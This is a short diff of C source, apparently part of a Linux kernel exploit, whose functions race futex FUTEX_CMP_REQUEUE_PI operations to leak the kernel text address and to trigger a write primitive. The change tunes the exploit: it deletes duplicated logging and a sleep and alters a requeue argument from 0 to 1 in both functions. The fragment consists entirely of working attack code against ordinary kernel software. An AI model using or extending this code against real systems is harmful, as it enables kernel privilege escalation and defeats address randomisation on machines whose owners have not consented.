@@ -828,21 +828,13 @@ uint64_t slide_child_leak_stext(void) {
   /* Dar tiempo a que el waiter entre al WAIT_REQUEUE_PI. */
   usleep(SLIDE_REQUEUE_ARM_USEC);
 
-  pr_info("slide pre-requeue flags waiting=%d started=%d consumer=%d\n",
-          atomic_load(&slide_waiter_waiting),
-          atomic_load(&slide_owner_started),
-          atomic_load(&slide_consumer_ready));
-
-  /* Dar tiempo a que el waiter entre al WAIT_REQUEUE_PI. */
-  usleep(SLIDE_REQUEUE_ARM_USEC);
-
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
-    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)0,
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
     if (requeue_ret != 0) {
@@ -895,21 +887,13 @@ static int slide_child_trigger_write(void) {
   /* Dar tiempo a que el waiter entre al WAIT_REQUEUE_PI. */
   usleep(SLIDE_REQUEUE_ARM_USEC);
 
-  pr_info("slide pre-requeue flags waiting=%d started=%d consumer=%d\n",
-          atomic_load(&slide_waiter_waiting),
-          atomic_load(&slide_owner_started),
-          atomic_load(&slide_consumer_ready));
-
-  /* Dar tiempo a que el waiter entre al WAIT_REQUEUE_PI. */
-  usleep(SLIDE_REQUEUE_ARM_USEC);
-
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
-    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)0,
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
     if (requeue_ret != 0) {
